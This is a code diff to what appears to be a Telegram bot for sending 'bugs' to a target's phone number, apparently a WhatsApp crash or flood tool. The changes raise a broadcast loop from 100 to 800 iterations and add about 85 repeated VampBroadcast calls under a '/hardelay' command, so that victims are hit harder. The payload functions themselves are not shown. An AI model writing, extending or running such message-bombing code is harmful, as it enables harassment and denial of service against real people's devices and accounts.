@@ -1167,7 +1167,7 @@ async function VampOri(target) {
 
 }
 async function VampDelayInvis(target) {
-    for (let i = 0; i <= 100; i++) {
+    for (let i = 0; i <= 800; i++) {
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
     await VampBroadcast(target, mention = true)
@@ -1592,7 +1592,91 @@ bot.onText(/\/hardelay(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
+        await VampBroadcast(formatedNumber);
         await VampBroadcast(formatedNumber);
         await VampBroadcast(formatedNumber);
         await VampBroadcast(formatedNumber);
